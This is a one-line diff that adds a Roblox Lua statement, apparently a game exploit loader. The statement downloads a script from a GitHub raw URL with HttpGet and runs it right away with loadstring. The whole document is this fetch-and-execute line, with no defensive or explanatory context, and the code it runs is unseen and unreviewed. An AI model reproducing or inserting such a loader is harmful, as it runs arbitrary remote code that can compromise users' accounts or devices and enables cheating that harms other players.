@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ForestBaseDuel/loaders/main/loaders/electricity-bricklayer-spam0-465s38k1jkrrmr.lua"))()
